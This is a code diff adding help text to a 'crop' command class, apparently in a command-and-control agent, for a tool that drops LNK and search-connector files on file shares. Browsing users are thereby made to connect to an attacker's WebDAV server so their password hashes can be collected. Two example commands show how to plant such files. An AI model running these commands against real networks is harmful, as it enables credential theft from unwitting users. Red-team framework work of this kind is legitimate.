@@ -94,9 +94,23 @@ class FarmerCommand(CommandBase):
     cmd = "crop"
     needs_admin = False
     help_cmd = "crop"
-    description = "Crop stuff"
+    description = "Drop a file for hash collection"
     version = 1
     is_exit = False
+    help_cmd = """
+Crop https://github.com/mdsecactivebreach/Farmer
+    created by @domchell
+
+Crop is a tool that can create LNK files that initiate a WebDAV connection when browsing to a folder where it's stored.
+
+Supported LNK types: .lnk, .url, .library-ms, .searchconnect-ms
+
+Drop an LNK file
+crop -targetLocation \\myserver\shared\ -targetFilename Athena.lnk -targetPath \\MyCropServer:8080\harvest -targetIcon \\MyCropServer:8080\harvest\my.ico
+
+Drop a .searchconnect-ms
+crop -targetLocation \\myserver\shared\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\harvest -recurse      
+    """
     is_file_browse = False
     is_process_list = False
     is_download_file = False
